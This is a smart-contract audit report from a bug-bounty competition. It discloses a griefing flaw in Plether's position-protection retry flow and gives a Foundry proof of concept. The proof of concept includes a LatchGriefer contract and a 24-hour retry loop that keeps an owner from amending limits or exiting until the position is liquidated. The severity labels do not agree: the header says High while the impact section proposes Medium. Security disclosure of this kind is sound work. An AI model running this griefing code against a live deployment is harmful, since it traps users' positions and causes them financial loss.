# \#99605 [SC-High] Permissionless protection retries repeatedly block the owner's close-limit amendment

**Submitted on Nov 14th 2026 at 13:06:34 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99605
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
When a protection close fails its stored financial limits, the owner can amend those limits only while the protection is `Latched` and has no pending order. `retryPositionProtectionClose` is permissionless and immediately queues another attempt with the same limits. A third party can terminalize a doomed attempt and retry atomically, so the state visible to the owner after that transaction is `Triggered` again. The owner's amendment and ordinary close calls revert. The owner can recover by terminalizing the pending attempt themselves and amending before another retry lands, but this requires an additional transaction and creates a race that the documented amendment flow does not address.

## Vulnerability Details
The owner has a LONG with a stop-loss and a maximum execution notional of 10,600 USDG. A valid trigger moves the price from 1.00 to 1.10; closing 10,000 units would use 11,000 USDG of notional and fails the owner's ceiling. The failed attempt leaves the protection `Latched`. The owner intends to loosen the ceiling and exit.

`amendLatchedPositionProtectionCloseLimits` requires `Latched` and an empty account order queue ([PositionProtectionBook.sol, lines 315–327](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327)). Any address may call `retryPositionProtectionClose`, which commits a new close attempt under the stored limits and changes the status to `Triggered` ([lines 379–405](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L379-L405)). The attempt fails or expires without changing the position and relatches; a caller can execute or expire it and retry in one transaction. While the retry is pending, amendment reverts `ProtectionNotLatched`, cancellation reverts `ProtectionNotArmed`, and an ordinary close commit reverts `ProtectionActive`. Repeating the same retry is ineffective because it retains the stale ceiling.

Plether's [canonical instructions](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L121-L148) describe amendment for a latched protection and state its no-pending-order condition. They also describe permissionless retry for keepers. The issue is that a third party can repeatedly take the only amendable state away at transaction boundaries, making the prescribed owner action fail. This is a collision between two documented actions, not a claim that their preconditions are hidden.

## Impact Details
The proposed [Immunefi impact](https://immunefi.com/audit-competition/plether/scope/) is **Medium griefing**. The attacker can make the owner's amend and ordinary exit calls repeatedly fail while the position stays exposed. An owner who attempts amendment during a retry pays for a reverted transaction. To regain the amendment window, an EOA owner must submit a transaction to execute the pending doomed attempt (or expire it after its deadline), then submit an amendment before a third party retries. The focused PoC shows a third-party retry between those owner transactions makes the amendment revert again; the extra terminalization call consumed about 523,000 gas in the test, including Foundry call overhead. That is an illustration of cost, not an on-chain receipt or a guaranteed gas amount.

There is a working escape. If the EOA's terminalization and amendment land consecutively, the second succeeds, and a subsequent retry uses the new limits. A contract wallet can combine terminalization and amendment atomically. Therefore this report does **not** claim an unavoidable one-hour fund freeze or forced liquidation loss. The longer loop PoCs demonstrate that a third party can sustain the obstructed state if the owner follows only the normal amendment route; they do not establish that every owner must remain trapped. The attacker's ability to interpose on a live chain depends on transaction ordering and continued gas expenditure.



## Proof of Concept

## Proof of Concept

Place `Liq_LatchedAmendGrief.t.sol`, `Skeptic_LatchedEoaEscape.t.sol`, and `Custody_LatchedAmendGrief.t.sol` from `packages/perps/test/poc/` in the same directory of a checkout at the pinned commit. The Skeptic file imports the Liq file. Run from the repository root:

```bash
forge test test/poc/Skeptic_LatchedEoaEscape.t.sol --root packages/perps --offline --match-test test_AttackerInterposesBetweenEoaRecoveryTransactions --out out-latched-grief --cache-path cache-latched-grief -vv
forge test test/poc/Skeptic_LatchedEoaEscape.t.sol --root packages/perps --offline --match-test test_Skeptic_EoaOwnerEscapesWithTwoPlainTxs --out out-latched-grief --cache-path cache-latched-grief -vv
forge test test/poc/Custody_LatchedAmendGrief.t.sol --root packages/perps --offline --match-test test_LatchedProtection_ThirdPartyRetryLoopBlocksOwnerAmendAndEveryExit --gas-limit 100000000000 --out out-latched-grief --cache-path cache-latched-grief -vv
```

The first test places a third-party retry between two owner recovery transactions and proves the amendment reverts again. The second proves the EOA escape when those transactions land consecutively. The third sustains the obstructed normal path for more than one hour. All three targeted tests passed locally. No in-scope source contract is modified.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Permissionless griefer: keeps a Latched protection permanently "pending" so the owner can never
///         amend its stale close limits (amendment requires zero pending orders) and can never exit the position.
contract LatchGriefer {

    OrderRouter internal immutable ROUTER;
    IPositionProtectionActions internal immutable BOOK;

    constructor(
        OrderRouter router_,
        IPositionProtectionActions book_
    ) {
        ROUTER = router_;
        BOOK = book_;
    }

    /// @dev Execute the doomed attempt (it fails on the stale ceiling and relatches) and re-queue it atomically.
    function executeAndRetry(
        uint64 orderId,
        bytes[] calldata data,
        uint64 protectionId
    ) external returns (uint64) {
        ROUTER.executeOrder(orderId, data);
        return BOOK.retryPositionProtectionClose(protectionId);
    }

    /// @dev Oracle-free variant: expire the attempt (relatches) and re-queue it atomically. Costs only gas.
    function expireAndRetry(
        uint64 orderId,
        uint64 protectionId
    ) external returns (uint64) {
        ROUTER.expireOrder(orderId);
        return BOOK.retryPositionProtectionClose(protectionId);
    }

}

/// @notice A smart-contract-wallet owner (used only to bound severity).
contract OwnerBundle {

    OrderRouter internal immutable ROUTER;
    IPositionProtectionActions internal immutable BOOK;

    constructor(
        OrderRouter router_,
        IPositionProtectionActions book_
    ) {
        ROUTER = router_;
        BOOK = book_;
    }

    function create(
        PositionProtectionTypes.PositionProtectionParams calldata params
    ) external returns (uint64) {
        return BOOK.createPositionProtection(params);
    }

    function failAmendRetry(
        uint64 orderId,
        bytes[] calldata data,
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata limits
    ) external returns (uint64) {
        ROUTER.executeOrder(orderId, data);
        BOOK.amendLatchedPositionProtectionCloseLimits(protectionId, limits);
        return BOOK.retryPositionProtectionClose(protectionId);
    }

}

contract Liq_LatchedAmendGriefTest is BasePerpTest {

    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;

    address internal constant ALICE = address(0xA11CE);
    address internal constant HONEST_KEEPER = address(0xE0EC);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant LIQUIDATOR = address(0x1D0D);

    uint256 internal constant MARK_PRICE = 1e8; // 1.00
    uint256 internal constant STOP_LOSS = 105_000_000; // 1.05 (LONG loses when the basket rises)
    uint256 internal constant GAP_PRICE = 110_000_000; // 1.10 gap through the stop
    uint256 internal constant CRASH_PRICE = 125_000_000; // 1.25 later
    uint256 internal constant SIZE = 10_000e18; // 100 lots -> 10,000 USDG notional at 1.00
    uint256 internal constant MARGIN = 2000e6;
    // Trader's slippage guard: "do not close above ~1.06" (notional 10,600). The 1.10 gap breaches it.
    uint256 internal constant NOTIONAL_CEILING = 10_600e6;

    LatchGriefer internal griefer;

    /// @dev Release parameters from DEPLOYMENT.md (VPI disabled to isolate the protection lifecycle).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        protectionActions = IPositionProtectionActions(address(router.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        griefer = new LatchGriefer(OrderRouter(payable(address(router))), protectionActions);
        _fundTrader(ALICE, 3000e6);
        _refreshMark(MARK_PRICE);
    }

    // ------------------------------------------------------------------ helpers

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _armStopLoss() internal returns (uint64 protectionId) {
        _open(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: NOTIONAL_CEILING,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
    }

    /// @dev Market gaps through the stop; any keeper triggers; the honest keeper's execution fails on the ceiling.
    function _gapTriggerAndFirstFailure(
        uint64 protectionId
    ) internal returns (uint64 linkedOrderId) {
        _mockPythUpdateData(GAP_PRICE);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, _livePriceData(GAP_PRICE));
    }

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    function _loosened() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l.maxExecutionNotionalAssets = type(uint256).max;
        l.maxGrossAccountDebitAssets = type(uint256).max;
        l.maxActionChargeAssets = type(uint256).max;
        l.maxExplicitFeesAssets = type(uint256).max;
    }

    function _assertAliceHasNoExit(
        uint64 protectionId
    ) internal {
        // 1. Amendment of the stale limit is blocked while the griefer's attempt is pending (status is Triggered,
        //    never Latched, at every transaction boundary the owner can observe).
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _loosened());
        // 2. An ordinary close commitment is blocked by the active protection lock.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        // 3. Cancelling (plain or atomic exit) is only possible from PendingOpen/Armed.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);
        OrderV3Types.OrderRequest memory exitRequest = _dummyCloseRequest();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, exitRequest);
    }

    function _dummyCloseRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256("alice-exit");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = SIZE;
        request.targetPrice = type(uint256).max;
        request.isClose = true;
        request.bounds.submitBy = uint64(vm.getBlockTimestamp());
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

    // ------------------------------------------------------------------ control

    /// @notice Without interference the owner amends the stale ceiling and exits at the gap price.
    function test_Control_OwnerAmendsAndExitsAfterLatch() public {
        uint64 protectionId = _armStopLoss();
        uint64 firstAttempt = _gapTriggerAndFirstFailure(protectionId);

        bytes[] memory execData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(HONEST_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(firstAttempt, execData);
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _loosened());
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        execData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(HONEST_KEEPER);
        r = router.executeOrder(retryId, execData);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry closes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0);
        emit log_named_decimal_uint("control: Alice clearinghouse balance after exit", clearinghouse.balanceAssets(ALICE), 6);
        // ~3000 deposit - 1000 price loss - fees/carry
        assertGt(clearinghouse.balanceAssets(ALICE), 1990e6);
    }

    /// @notice Severity bound: an owner that is a smart-contract wallet can escape by atomically failing the live
    ///         attempt, amending, and retrying in one transaction (the griefer cannot wedge a tx in between).
    function test_Bound_ContractOwnerCanEscapeAtomically() public {
        OwnerBundle bundle = new OwnerBundle(OrderRouter(payable(address(router))), protectionActions);
        _fundTrader(address(bundle), 3000e6);
        _open(address(bundle), CfdTypes.Side.LONG, SIZE, MARGIN, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: NOTIONAL_CEILING,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        uint64 protectionId = bundle.create(params);
        _mockPythUpdateData(GAP_PRICE);
        vm.prank(TRIGGER_KEEPER);
        uint64 attempt = protectionActions.triggerPositionProtection(protectionId, _livePriceData(GAP_PRICE));
        // Griefer pins once.
        bytes[] memory execData = _mockPythUpdateData(GAP_PRICE);
        attempt = griefer.executeAndRetry(attempt, execData, protectionId);
        // Owner bundle: fail the pinned attempt, amend, re-queue with loosened limits -- all in one tx.
        execData = _mockPythUpdateData(GAP_PRICE);
        uint64 fixedAttempt = bundle.failAmendRetry(attempt, execData, protectionId, _loosened());
        execData = _mockPythUpdateData(GAP_PRICE);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(fixedAttempt, execData);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "atomic owner bundle escapes");
    }

    // ------------------------------------------------------------------ attack

    function test_Grief_PermissionlessRetryPinsStaleLimitsAndForcesLiquidation() public {
        uint64 protectionId = _armStopLoss();
        uint64 attempt = _gapTriggerAndFirstFailure(protectionId);

        // The first attempt fails on the trader's stale ceiling. The griefer executes it and atomically re-queues a
        // fresh attempt with the SAME stale ceiling, so the owner never observes Latched-with-no-pending-order.
        bytes[] memory execData = _mockPythUpdateData(GAP_PRICE);
        attempt = griefer.executeAndRetry(attempt, execData, protectionId);
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
        _assertAliceHasNoExit(protectionId);
        // Actions that remain available to the victim: addMargin, deposit, and withdrawal of unpledged free
        // settlement (health-gated). None of them reduces exposure or exits the position.
        vm.prank(ALICE);
        engine.addMargin(ALICE, 10e6);
        _fundTrader(ALICE, 10e6);
        _refreshMark(GAP_PRICE);
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, 10e6);

        // Sustain for 24 hours with the oracle-free expire+retry loop (one call per 61 s execution window).
        uint256 cycles;
        uint256 totalGas;
        uint256 start = vm.getBlockTimestamp();
        while (vm.getBlockTimestamp() < start + 24 hours) {
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            uint256 g = gasleft();
            attempt = griefer.expireAndRetry(attempt, protectionId);
            totalGas += g - gasleft();
            ++cycles;
        }
        emit log_named_uint("griefing cycles in 24h", cycles);
        emit log_named_uint("average griefer gas per cycle", totalGas / cycles);
        _assertAliceHasNoExit(protectionId);
        (uint256 sizeAfterDay,,,,,,) = engine.positions(ALICE);
        assertEq(sizeAfterDay, SIZE, "after 24h of griefing the owner still cannot leave the position");

        // The market keeps moving against the trapped LONG; a liquidator takes the position.
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(LIQUIDATOR);
        router.executeLiquidation(ALICE, _livePriceData(CRASH_PRICE));
        (uint256 sizeEnd,,,,,,) = engine.positions(ALICE);
        assertEq(sizeEnd, 0, "position liquidated");
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated));

        uint256 griefedBalance = clearinghouse.balanceAssets(ALICE);
        emit log_named_decimal_uint("grief: Alice clearinghouse balance after liquidation", griefedBalance, 6);
        // Only the 1,000 USDG that was never pledged survives; the whole 2,000 USDG pledge is lost (vs ~1,000 lost
        // in the control path).
        assertLt(griefedBalance, 1000e6, "owner lost at least 1,000 USDG more than the control exit");
    }

}

```
